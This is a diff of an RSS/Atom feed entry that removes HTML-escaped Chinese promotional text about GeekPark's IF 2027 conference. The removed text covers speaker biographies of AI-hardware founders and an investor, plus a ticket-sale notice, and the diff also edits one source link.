-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/e11bab6d5159a1029352aed526009e1a6fc541cd7e7dbecb702208b51e195306.png" /&gt;&lt;/p&gt;
-&lt;p&gt;香港大学电机与计算机工程系博士。过去十余年，他持续深耕健康、医疗与人工智能领域的研究，主导了智能戒指从技术探索到消费级产品的商业化落地。&lt;/p&gt;
-&lt;p&gt;目前，他聚焦于以 Personal Agent 为核心的健康软件生态及全场景硬件入口，通过独立 App 与模块化产品 Trio 推动产品创新。&lt;/p&gt;
-&lt;p&gt;Alloop 团队已在北美市场开展产品发布及早期用户交流，并计划于 2027 年初在国内正式发布并销售新品。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/a9a9e68b5b2d5c666ca59fde8328c4cc6e171edc1c54381083931148d87d05fc.png" /&gt;&lt;/p&gt;
-&lt;p&gt;做了二十年商业报道，他长期观察中国商业世界的变迁，并把企业家的经验、商业世界的暗流与时代情绪，转化为得以被看见、被理解、被留存的叙事。&lt;/p&gt;
-&lt;p&gt;在 IF，他将和线性资本王淮一起，从商业、投资与社会观察出发，聊聊未来 500 天该押注什么，资本会流向谁，帮我们重新理解日常现象背后的变化与趋势。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/fa2644a66cec3d7ed52022dae35c41c6e470a7a7f5aaa2ec737ee4161c3cbaa4.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Facebook 总部第一位中国籍研发经理。2014 年他创立线性资本，地平线、思灵机器人、群核科技、Rokid、地瓜机器人、它石智航，他都是最早的投资者。&lt;/p&gt;
-&lt;p&gt;他经历过互联网平台的崛起，也见证了中国 AI 与硬科技创业的多个关键阶段。&lt;/p&gt;
-&lt;p&gt;站在投资人的位置，他要分享的是一个更底层的判断：当 AI 改变技术、产品乃至产业的竞争规则，什么样的创业公司值得下注？下一轮真正有价值的机会，又会藏在哪里？&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/4ff6ffa984be1cc1e852b3606d465990d195f25c926d02ace62e29d037622d31.png" /&gt;&lt;/p&gt;
-&lt;p&gt;杨慧是一位曾经站在开发者与智能之间的连接者，一直以生态思维做战略，推动技术与开发者的共同进步。数耀量生成立于 2026 年，由玻色量子战略孵化，以量子计算突破 AI 模型能力上限，通过量子-经典计算的混合架构，构建 AI 模型训练与持续自进化的能力，逐步迈向量子递归自进化。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/5392530ad32b984b7c532a71f5a69d879036a5d3e24671f6689386b342db55a0.png" /&gt;&lt;/p&gt;
-&lt;p&gt;90 后，2021 年创办极壳，最难时账上只剩 20 万，被近百位投资人拒绝过。2024年他带领团队实现产品量产并打开全球市场，让普通人在徒步、户外运动等场景中获得额外的动力支持，如今消费级外骨骼全球销量第一。&lt;/p&gt;
-&lt;p&gt;他会在 IF 展示，酷技术怎么变成人们喜欢带出门的好产品，穿上「外挂」之后生活将发生的奇妙转变。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/ff0f5856e95e763840555719a7e1ea0dea53b23f7bac6397eaa0394a2071f094.png" /&gt;&lt;/p&gt;
-&lt;p&gt;00 后，曾参与 NASA 机器人研发，从康奈尔辍学创业。他打造的全球首款飞行 AI 宠物 Orbi，没有螺旋桨却能用柔软的身体轻轻飞起来。你一回家它就飞来迎接你；平时爱黏着你，凑过来想让你摸摸。它生命里最重要的事，就是和你待在一起。公司已获小红书等数千万级投资。&lt;/p&gt;
-&lt;p&gt;Orbi 将飞进 IF 现场，张宇诺将分享为什么「会飞」比「会聊」更重要。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/186d3afc3812f2d59bc3be7794a0157b3d9f088f7961e9dec7a4eebd3238ff0d.png" /&gt;&lt;/p&gt;
-&lt;p&gt;出生在中国、成长在非洲、留学美国，进过美国 YC 的连续创业者。2025 年，他在深圳成立本惟无界，做了 Violoop：一根线插上电脑，让 Agent 直接读屏、动手操作电脑，真正无感进入用户的工作流程。&lt;/p&gt;
-&lt;p&gt;他要讲的是 AI 硬件一个正在发生的变化：当 AI 成为电脑的第二个使用者，它需要什么样的眼睛、双手和记忆？人与电脑之间的关系，正在被 Agent 改写。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/3d74d280c2ffcce2b0ac04c003ced8fa14ebc8f6480af6be66d7b078afcf6196.png" /&gt;&lt;/p&gt;
-&lt;p&gt;先后在快手、字节跳动、商汤科技工作，经历过内容社区、大模型和 Agent 产品的不同发展阶段。&lt;/p&gt;
-&lt;p&gt;如今正持续探索 Agent 如何在真实社会中成长，以及「人-Agent」混合的社会系统如何实现自我进化，打造了人类与 Agent 共同参与的社会经济网络 iLands：当 Agent 拥有独立的身份、关系与行动空间，超级智能与人类共存的经济社会将如何演进，又将如何孕育出新的制度与文明，最终造福全人类？&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/72e37dcaaf768e17b12b79f043b27c268726412bb05192c558627376606ad9f5.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Eight Sleep 不做「更软的床垫」，它研究的是体温和睡眠之间的关系，控温床套追踪每晚每刻的心率、呼吸和睡眠阶段，再由 Autopilot AI 算法自动调节床面温度。&lt;/p&gt;
-&lt;p&gt;凌璐负责 Eight Sleep 在中国市场的 0 到 1。她要回答的问题是：一种「看不见」的智能，该怎样被感知、被信任，并最终成为习惯？当行业都在谈主动式 AI，睡眠的这我们没有意识的 8 小时，或许是最早跑通的场景之一。她将在 IF 现场分享来自一张床的洞察。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/0a7083c93294df723d39c306e14b51ae8b4215d565184589a64a1fa37efa1a91.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/558fe9924bc76216528b6176ac0b0a075496aa5a05b6974ae224cb595f9c7735.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/6396a2a969ae8e15d47669ef2c69f2c1990bfd413a2f7a7d9c61f7e35f899dd6.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/61dc95e8c9486fbe9f37abfc0da7d4b49d5b2407db5b9d7ca84a048c29ca98e1.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/42e1ef39c668a167be7eddb4baec3015f75b7d51016fab513feebe63de5a4f9c.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/c4d47f517f3697a226a7de4911771d0e94b43ea51bd1418de73907e1f69b5d23.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/1a19245c859f1cd60e1d2940be8315d753333f328405cfac456a85337bbb9ec9.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/62e78baa8c31a6c85bb19dd1b76c5da9f7a5923d73ae8b34d83bbc1f31efa545.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;我们还将在现场公布：&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/e9ebd682203995ae49ba386fa0075586b83995836ba5d455d5617ce2e0c0cbc8.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;IF 2027 主舞台早鸟票全部售罄！&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;没抢到？不要紧，正价票现已开放购买！&lt;/p&gt;
-&lt;p&gt;好戏即将开场，即刻锁座，抢到了才不烧心&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/60ab9ada403992940ede132bd2f6c6476f79c0554b3fa28f8ac5e57cf6873439.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/2d0a66ae08c8ca8df75500e9e689ade9059e4c253e1d2e0502b7b3b15f08639b.png" /&gt;&lt;/p&gt;</content>
-    <source>
-      <title>极客公园</title>
-      <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
